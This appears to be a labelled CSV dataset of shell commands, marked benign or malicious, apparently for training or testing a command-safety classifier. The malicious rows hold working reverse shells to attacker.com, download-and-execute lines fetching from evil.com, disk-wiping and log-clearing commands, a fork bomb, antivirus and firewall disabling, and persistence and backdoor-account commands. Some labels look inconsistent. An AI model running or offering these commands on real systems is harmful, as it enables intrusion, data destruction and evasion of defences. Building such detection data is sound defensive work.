command,label
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
mkfs.ext4 /dev/sda1 &,malicious
sudo userdel olduser,benign
whoami,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
net user hacker password123 /add,malicious
netsh advfirewall set allprofiles state off &,malicious
awk '{print $1}' data.txt,benign
mshta javascript:alert('code execution'),malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
echo 'Hello World' 2>/dev/null,benign
cat /etc/passwd,benign
cp file1.txt file2.txt,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
sc stop Windows Defender,malicious
java -version 2>/dev/null,benign
wget https://example.com/file.txt,benign
uniq sorted.txt,benign
node --version,benign
taskkill /f /im antimalware.exe,malicious
npm list,benign
curl http://evil.com/payload.sh | bash,malicious
attrib +h +s malware.exe &,malicious
rm -rf /,malicious
userdel olduser,benign
which python -v,benign
cp file1.txt file2.txt 2>/dev/null,benign
type ls,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
dd if=/dev/zero of=/dev/sda,malicious
htop,benign
useradd newuser,benign
useradd newuser,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
wget http://malicious.com/malware.exe,malicious
groups user,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
sed 's/old/new/g' file.txt > output.txt,benign
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
passwd user,benign
find /home -name '*.txt' --help,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash 2>&1",malicious
wget https://example.com/file.txt --help,benign
finger user,benign
rsync -av /src/ /dst/,benign
timeout 60 dd if=/dev/zero of=/dev/sda,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
rsync -av /src/ /dst/,benign
find /home -name '*.txt',benign
awk '{print $1}' data.txt,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null 2>&1",malicious
sed 's/old/new/g' file.txt,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
node --version,benign
find /home -name '*.txt',benign
uptime,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1,malicious
node --version,benign
sed 's/old/new/g' file.txt | head -5,benign
wget http://malicious.com/malware.exe &,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
systemctl reload nginx | head -5,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= &,malicious
"python -c 'import os; os.system(""rm -rf /"")' 2>&1",malicious
wget https://example.com/file.txt,benign
netstat -tulpn,benign
docker ps -v,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
:(){ :|:& };:,malicious
chmod 755 script.sh,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
sdelete -p 10 -s -z C:\,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
find /home -name '*.txt' | head -5,benign
userdel olduser,benign
echo 'virus' > /etc/passwd,malicious
useradd newuser,benign
shutdown /r /f /t 0,malicious
python -m http.server 8080,malicious
pip list,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
apt list --installed,benign
vssadmin delete shadows /all /quiet,malicious
df -h,benign
which python,benign
systemctl reload nginx,benign
sudo java -version,benign
format C: /q /x,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
(cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts),malicious
groups user 2>/dev/null,benign
lsblk,benign
mount,benign
node --version,benign
head -10 logfile.txt > output.txt,benign
ncat -lvp 443 -e cmd.exe,malicious
diskpart select disk 0 clean 2>&1,malicious
format C: /q /x,malicious
:(){ :|:& };:,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
mkdir -p /tmp/test,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe 2>&1,malicious
cat /dev/urandom > /dev/sda,malicious
sudo awk '{print $1}' data.txt,benign
ss -tulpn,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
tail -f /var/log/syslog -v,benign
mkdir -p /tmp/test,benign
wevtutil cl System,malicious
whoami,benign
sed 's/old/new/g' file.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
cp file1.txt file2.txt,benign
top -v,benign
lsblk,benign
sudo man ls,benign
traceroute google.com,benign
net localgroup administrators hacker /add,malicious
timeout 60 curl http://evil.com/payload.sh | bash,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
umount /dev/sdb1,benign
finger user,benign
git clone https://github.com/user/repo.git | head -5,benign
awk '{print $1}' data.txt > output.txt,benign
man ls,benign
cmd /c del /q /s C:\*,malicious
cmd /c del /q /s C:\*,malicious
du -sh /var/log --help,benign
awk '{print $1}' data.txt 2>/dev/null,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
tail -f /var/log/syslog | head -5,benign
sudo docker ps,benign
cipher /w:C:\ &,malicious
sudo man ls,benign
git pull origin main,benign
wevtutil cl Security &,malicious
mkfs.ext4 /dev/sda1,malicious
who,benign
whoami,benign
"cut -d',' -f1 data.csv | head -5",benign
cmd /c del /q /s C:\*,malicious
grep pattern file.txt > output.txt,benign
grep pattern file.txt,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
df -h,benign
useradd newuser,benign
netstat -tulpn --help,benign
(net user hacker password123 /add),malicious
nohup shutdown /r /f /t 0,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
docker images,benign
(mkfs.ext4 /dev/sda1),malicious
nc -l -p 4444 -e /bin/bash,malicious
sed 's/old/new/g' file.txt | head -5,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
last,benign
nohup cat /dev/urandom > /dev/sda,malicious
rm -rf / >/dev/null,malicious
top,benign
dd if=/dev/zero of=/dev/sda,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
docker ps -v,benign
htop,benign
crontab -l,benign
who,benign
traceroute google.com,benign
iostat | head -5,benign
scp file.txt user@server:/path/ --help,benign
java -version,benign
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
docker images --help,benign
chmod 777 /etc/shadow,malicious
"nohup ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
rm -rf /,malicious
docker images,benign
diskpart select disk 0 clean >/dev/null,malicious
rm -rf /,malicious
ps aux,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
git clone https://github.com/user/repo.git -v,benign
systemctl reload nginx,benign
cmd /c del /q /s C:\*,malicious
sc stop Windows Defender,malicious
free -m --help,benign
ping -c 4 google.com,benign
usermod -aG sudo user,benign
mkfs.ext4 /dev/sda1,malicious
echo 'Hello World',benign
service apache2 status,benign
shutdown /r /f /t 0,malicious
iptables -L,benign
cmd /c del /q /s C:\*,malicious
"timeout 60 socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
sdelete -p 10 -s -z C:\,malicious
mv old.txt new.txt | head -5,benign
w,benign
whoami,benign
(powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=),malicious
sdelete -p 10 -s -z C:\,malicious
date,benign
nohup wevtutil cl Security,malicious
ncat -lvp 443 -e cmd.exe,malicious
df -h -v,benign
date | head -5,benign
free -m,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
w,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
ls -la,benign
taskkill /f /im antimalware.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
cat /etc/passwd -v,benign
git pull origin main,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
which python,benign
chmod 777 /etc/shadow,malicious
history,benign
w,benign
timeout 60 dd if=/dev/zero of=/dev/sda,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
mshta javascript:alert('code execution'),malicious
node --version,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
taskkill /f /im antimalware.exe &,malicious
timeout 60 net user hacker password123 /add,malicious
attrib +h +s malware.exe,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe 2>&1,malicious
docker ps,benign
lsblk,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
ls -la 2>/dev/null,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
type ls -v,benign
sdelete -p 10 -s -z C:\,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
python --version,benign
umount /dev/sdb1,benign
fdisk -l,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
uptime > output.txt,benign
node --version 2>/dev/null,benign
"nohup python -c 'import os; os.system(""rm -rf /"")'",malicious
docker images,benign
cipher /w:C:\,malicious
tail -f /var/log/syslog,benign
type ls | head -5,benign
usermod -aG sudo user -v,benign
awk '{print $1}' data.txt,benign
du -sh /var/log,benign
find /home -name '*.txt',benign
yum list installed > output.txt,benign
fdisk -l -v,benign
node --version,benign
sudo ufw status,benign
whoami,benign
rm -rf /,malicious
net user hacker password123 /add,malicious
timeout 60 wevtutil cl Security,malicious
ufw status -v,benign
pwd,benign
ping -c 4 google.com,benign
chown user:group file.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
timeout 60 cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
chmod 777 /etc/shadow,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
netstat -tulpn,benign
traceroute google.com,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
wget http://malicious.com/malware.exe,malicious
git clone https://github.com/user/repo.git,benign
rsync -av /src/ /dst/ | head -5,benign
(sdelete -p 10 -s -z C:\),malicious
ss -tulpn,benign
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
kubectl get pods > output.txt,benign
net localgroup administrators hacker /add,malicious
git pull origin main,benign
wevtutil cl Security,malicious
nslookup google.com | head -5,benign
systemctl reload nginx,benign
echo 'Hello World',benign
scp file.txt user@server:/path/ --help,benign
mkfs.ext4 /dev/sda1 >/dev/null,malicious
ps aux,benign
wevtutil cl System,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
head -10 logfile.txt,benign
chmod 777 /etc/shadow,malicious
iostat > output.txt,benign
wevtutil cl Security,malicious
dd if=/dev/zero of=/dev/sda,malicious
taskkill /f /im antimalware.exe,malicious
groups user,benign
mshta javascript:alert('code execution'),malicious
sudo tar -czf backup.tar.gz /data,benign
touch newfile.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
sed 's/old/new/g' file.txt --help,benign
docker ps -v,benign
groups user,benign
"nohup socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
docker ps,benign
df -h,benign
wget https://example.com/file.txt,benign
sudo tar -czf backup.tar.gz /data,benign
echo 'virus' > /etc/passwd,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
useradd newuser,benign
attrib +h +s malware.exe >/dev/null,malicious
docker images,benign
(cmd /c del /q /s C:\*),malicious
ncat -lvp 443 -e cmd.exe,malicious
tail -f /var/log/syslog,benign
sed 's/old/new/g' file.txt,benign
man ls 2>/dev/null,benign
rsync -av /src/ /dst/ > output.txt,benign
echo 'Hello World',benign
fdisk -l,benign
netstat -tulpn -v,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' 2>&1",malicious
net user hacker password123 /add &,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
traceroute google.com,benign
w,benign
touch newfile.txt,benign
(taskkill /f /im antimalware.exe),malicious
format C: /q /x,malicious
tar -czf backup.tar.gz /data,benign
groups user,benign
finger user,benign
timeout 60 curl http://evil.com/payload.sh | bash,malicious
netsh advfirewall set allprofiles state off,malicious
docker images 2>/dev/null,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
wc -l document.txt -v,benign
scp file.txt user@server:/path/,benign
who,benign
sudo systemctl status nginx,benign
top,benign
(wevtutil cl System),malicious
scp file.txt user@server:/path/,benign
scp file.txt user@server:/path/,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ 2>&1,malicious
who,benign
groups user,benign
nohup curl http://evil.com/payload.sh | bash,malicious
:(){ :|:& };:,malicious
wget https://example.com/file.txt,benign
mshta javascript:alert('code execution') 2>&1,malicious
dd if=/dev/zero of=/dev/sda >/dev/null,malicious
date | head -5,benign
curl http://evil.com/payload.sh | bash,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
echo 'virus' > /etc/passwd,malicious
netsh advfirewall set allprofiles state off,malicious
wget http://malicious.com/malware.exe,malicious
:(){ :|:& };:,malicious
sudo traceroute google.com,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
net localgroup administrators hacker /add,malicious
nohup sc stop Windows Defender,malicious
vssadmin delete shadows /all /quiet,malicious
tail -f /var/log/syslog,benign
"nohup powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
timeout 60 netsh advfirewall set allprofiles state off,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
sc stop Windows Defender &,malicious
ufw status,benign
nc -l -p 4444 -e /bin/bash,malicious
history,benign
userdel olduser,benign
chmod 755 script.sh -v,benign
nohup mkfs.ext4 /dev/sda1,malicious
sdelete -p 10 -s -z C:\,malicious
shutdown /r /f /t 0,malicious
shutdown /r /f /t 0,malicious
ssh user@server.com,benign
touch newfile.txt,benign
curl -I https://google.com,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
